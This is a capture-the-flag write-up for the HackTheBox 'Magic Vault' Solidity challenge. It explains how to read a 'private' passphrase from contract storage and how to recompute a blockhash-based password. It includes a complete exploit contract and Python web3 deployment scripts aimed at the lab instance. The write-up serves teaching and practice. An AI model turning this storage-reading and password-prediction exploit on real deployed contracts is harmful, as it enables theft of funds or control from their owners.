````markdown
# Magic Vault — HackTheBox Blockchain Challenge Writeup

**Challenge**: Magic Vault  
**Difficulty**: Easy  
**Category**: Blockchain  

---

## Challenge Description

> Alex walked through the monster's dorm, her sword drawn. As she explored, she found a small room hidden behind a heavy curtain. Inside, she saw a small, dark chamber with a single chest in the center. It was the magic vault she had heard rumors of, containing powerful magical artifacts. Excited, Alex approached the chest and touched it, feeling the pulsing energy that radiated from it. But as she tried to open it, she realized it was locked tight by powerful magic. Frustrated, she set out to find the key that would unlock it. She was determined to open the magic vault and find the treasures within.

This challenge introduces the concept of reading "private" storage from the blockchain and exploiting complex password validation logic.

---

## Initial Reconnaissance

After spawning the instance, I got:
- RPC URL
- Private key
- Target contract address (Vault)
- Setup contract address
- Flag endpoint

The challenge provides two contract files:

### Setup.sol
```solidity
contract Setup {
    Vault public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Vault();
    }

    function isSolved() public view returns (bool) {
        return TARGET.mapHolder() != address(TARGET);
    }
}
```

Win condition: Change the `mapHolder` from the Vault's address to something else (us!).

### Vault.sol
```solidity
contract Vault {
    struct Map {
        address holder;
    }

    Map map;
    address public owner;
    bytes32 private passphrase;
    uint256 public nonce;
    bool public isUnlocked;

    constructor() {
        owner = msg.sender;
        passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
        map = Map(address(this));
    }

    function mapHolder() public view returns (address) {
        return map.holder;
    }

    function claimContent() public {
        require(isUnlocked);
        map.holder = msg.sender;
    }

    function unlock(bytes16 _password) public {
        uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
        uint128 _input = uint128(_password);
        require(_input != _secretKey, "Case 1 failed");
        require(uint64(_input) == _secretKey, "Case 2 failed");
        require(uint64(bytes8(_password)) == uint64(uint160(owner)), "Case 3 failed");
        isUnlocked = true;
    }

    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

    function _magicPassword() private returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
}
```

---

## Analyzing the Vulnerability

The `unlock` function has three conditions that must all pass:

```solidity
uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
uint128 _input = uint128(_password);

require(_input != _secretKey, "Case 1 failed");           // Full password != secret
require(uint64(_input) == _secretKey, "Case 2 failed");   // Lower 64 bits == secret
require(uint64(bytes8(_password)) == uint64(uint160(owner)), "Case 3 failed"); // Upper 64 bits == owner's lower 64 bits
```

### Breaking Down the Conditions

**Case 1**: The full 128-bit password must NOT equal the secret key  
**Case 2**: The lower 64 bits of the password MUST equal the secret key  
**Case 3**: The upper 64 bits of the password MUST equal the owner's lower 64 bits

Wait, Case 1 and Case 2 seem contradictory at first! But they're not - the secret key is extracted as the lower 64 bits of the magic password, so when cast to uint128, it only has the lower 64 bits set. If our password has non-zero upper bits (from Case 3), then Case 1 will pass.

### The Password Structure

The password needs to be: `[owner_lower_64_bits][secret_lower_64_bits]`

- Upper 64 bits: Owner's lower 64 bits (satisfies Case 3)
- Lower 64 bits: Secret key's lower 64 bits (satisfies Case 2)
- Full 128 bits: Will differ from secret if owner != 0 (satisfies Case 1)

### The "Private" Passphrase

Notice the `passphrase` variable is marked as `private`:

```solidity
bytes32 private passphrase;
```

Here's the thing: **nothing is truly private on the blockchain**. The `private` keyword only prevents other contracts from accessing it via external calls. We can still read it directly from storage!

The passphrase is stored in storage slot 2:
- Slot 0: `map` struct
- Slot 1: `owner` address
- Slot 2: `passphrase`
- Slot 3: `nonce`
- Slot 4: `isUnlocked`

### The Real Challenge

The tricky part is that `_magicPassword()` calls `_generateKey()` which:
1. Uses `blockhash(block.number - _reductor)` 
2. Increments the nonce after each call

This means we can't just read the passphrase and calculate the magic password offline - the nonce changes and blockhashes are block-dependent.

### The Solution

We need to replicate the `_magicPassword()` logic in our own contract and call everything in the same transaction! This way:
- We're in the same block, so blockhashes match
- We read the nonce before it changes
- We calculate the password and unlock in one atomic transaction

---

## Prerequisites

- Python 3.x with web3.py, py-solc-x, and requests
- Active HTB instance

```bash
pip install web3 py-solc-x requests
```

---

## Exploitation

### The Exploit Contract

I created a contract that replicates the vault's password generation logic:

```solidity
interface IVault {
    function owner() external view returns (address);
    function nonce() external view returns (uint256);
    function unlock(bytes16 _password) external;
    function claimContent() external;
}

contract VaultExploit {
    function _generateKey(uint256 _reductor, uint256 nonce) private view returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
    }
    
    function _magicPassword(uint256 startNonce, bytes32 passphrase) private view returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1, startNonce);
        uint128 _key2 = uint128(_generateKey(2, startNonce + 1));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
    
    function exploit(address vaultAddress, bytes32 passphrase) external {
        IVault vault = IVault(vaultAddress);
        address owner = vault.owner();
        uint256 currentNonce = vault.nonce();
        
        uint64 ownerLower = uint64(uint160(owner));
        
        bytes8 magicPwd = _magicPassword(currentNonce, passphrase);
        uint128 _secretKey = uint128(bytes16(magicPwd) >> 64);
        uint64 secretLower = uint64(_secretKey);
        
        bytes16 password = bytes16((uint128(ownerLower) << 64) | uint128(secretLower));
        
        vault.unlock(password);
        vault.claimContent();
    }
}
```

The key insight is that `_generateKey` is a pure function that only depends on blockhash and nonce. Since we're calling everything in the same transaction:
- Same block number → same blockhashes
- We read the current nonce before the vault increments it
- Our calculations match the vault's exactly

### Step 1: Get Connection Info Automatically

I wrote the script to automatically fetch credentials from the HTB endpoint:

```python
BASE_URL = "http://83.136.249.47:46625"

response = requests.get(f"{BASE_URL}/connection_info", timeout=5)
conn_info = response.json()

RPC_URL = f"{BASE_URL}/rpc"
PRIVATE_KEY = conn_info['PrivateKey']
YOUR_ADDRESS = conn_info['Address']
VAULT_ADDRESS = conn_info['TargetAddress']
```

### Step 2: Read the Passphrase from Storage

Even though it's "private", we can read it directly:

```python
passphrase = w3.eth.get_storage_at(VAULT_ADDRESS, 2)
```

This reads storage slot 2 which contains the passphrase bytes32 value.

### Step 3: Compile and Deploy Exploit Contract

```python
compiled_sol = compile_source(exploit_source, output_values=['abi', 'bin'], solc_version='0.8.13')

contract_interface = None
for contract_name, contract_data in compiled_sol.items():
    if 'VaultExploit' in contract_name:
        contract_interface = contract_data
        break

bytecode = contract_interface['bin']
abi = contract_interface['abi']

ExploitContract = w3.eth.contract(abi=abi, bytecode=bytecode)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
transaction = ExploitContract.constructor().build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})

signed_txn = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
exploit_address = tx_receipt.contractAddress
```

### Step 4: Execute the Exploit

Call the exploit function with the vault address and passphrase:

```python
exploit_contract = w3.eth.contract(address=exploit_address, abi=abi)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
exploit_txn = exploit_contract.functions.exploit(VAULT_ADDRESS, passphrase).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 500000,
    'gasPrice': w3.eth.gas_price
})

signed_exploit = w3.eth.account.sign_transaction(exploit_txn, PRIVATE_KEY)
exploit_hash = w3.eth.send_raw_transaction(signed_exploit.raw_transaction)
exploit_receipt = w3.eth.wait_for_transaction_receipt(exploit_hash)
```

In this single transaction, our contract:
1. Reads the vault's owner and current nonce
2. Calculates the magic password using the same logic as the vault
3. Constructs the correct password satisfying all three conditions
4. Calls `unlock()` with that password
5. Calls `claimContent()` to become the mapHolder

---

## Running the Solution

1. **Spawn a new HTB instance**
2. **Update the BASE_URL** in `solve.py` if your instance has a different IP/port
3. **Run**:

```bash
python solve.py
```

The script automatically gets credentials from `/connection_info` endpoint!

### Expected Output

```
Getting connection info...
Connected to RPC
Exploit contract deployed at: 0x...
Exploit tx: 0x...
Done!

Flag: HTB{...}
```

---

## Key Takeaways

1. **Nothing is private on-chain**: The `private` keyword only affects contract-to-contract visibility, not external observers. Anyone can read any storage slot.

2. **Storage layout**: Understanding how Solidity stores variables is crucial:
   - State variables are stored sequentially in slots
   - Structs, arrays, and mappings have specific storage patterns
   - `web3.eth.get_storage_at(address, slot)` lets you read any slot

3. **Deterministic calculations**: Functions that depend on block data (blockhash, timestamp, block.number) can be replicated if called in the same transaction.

4. **Complex validation bypass**: Sometimes multiple conditions can be satisfied simultaneously with the right input structure.

5. **Atomic transactions**: Calling everything in one transaction ensures consistent state (same block, same nonce).

### What I Learned

- **Reading blockchain storage**: How to read "private" variables using web3
- **Storage slot calculation**: Understanding Solidity's storage layout
- **Password construction**: Building complex inputs that satisfy multiple conditions
- **Bit manipulation**: Working with bytes8, bytes16, uint64, uint128 conversions
- **Contract-based exploitation**: Replicating complex logic in an attack contract
- **py-solc-x**: Compiling Solidity inline with Python

### Common Issues

- **"Contract not found"**: Instance expired - get new credentials from `/connection_info`
- **"Exploit failed"**: Usually means the password calculation is wrong - verify you're using the correct passphrase and nonce
- **Compilation errors**: Make sure py-solc-x can download Solidity 0.8.13
- **Connection info 404**: Check the BASE_URL is correct for your instance

---

## Quick Reference

### Contract Functions Used
- `owner()` - View function, returns vault owner (Setup contract)
- `nonce()` - View function, returns current nonce (starts at 0)
- `unlock(bytes16 _password)` - Unlocks vault if password satisfies all conditions
- `claimContent()` - Sets mapHolder to caller if unlocked

### Password Structure
```
[Upper 64 bits: Owner's lower 64 bits][Lower 64 bits: Secret's lower 64 bits]
```

### Storage Layout
```
Slot 0: map.holder (address)
Slot 1: owner (address)
Slot 2: passphrase (bytes32) ← We read this!
Slot 3: nonce (uint256)
Slot 4: isUnlocked (bool)
```

### Exploit Flow
1. Read passphrase from storage slot 2
2. Deploy VaultExploit contract
3. Call `exploit(vaultAddress, passphrase)`
   - Contract reads owner and nonce
   - Replicates `_magicPassword()` calculation
   - Constructs correct password
   - Calls `unlock()` and `claimContent()`
4. mapHolder is now our exploit contract
5. Challenge solved!

### File Structure
```
Magic Vault/
├── Vault.sol          # Target contract with complex password logic
├── Setup.sol          # Deployment & win condition
├── VaultExploit.sol   # Exploit contract (replicated logic)
├── solve.py           # Python exploitation script
└── README.md          # This writeup
```

---

## Resources

- [Solidity Storage Layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html) - Official docs on storage
- [web3.py Storage Access](https://web3py.readthedocs.io/en/stable/web3.eth.html#web3.eth.Eth.get_storage_at) - Reading storage
- [Solidity by Example: Reading Private Data](https://solidity-by-example.org/hacks/accessing-private-data/) - Great tutorial
- [HackTheBox Platform](https://www.hackthebox.com/) - CTF challenges

**Challenge Rating**: ⭐⭐⭐☆☆ (Easy/Medium - Great intro to storage reading and complex validation)

**Time to Solve**: ~20-40 minutes

---

*Everything is public on the blockchain!*

````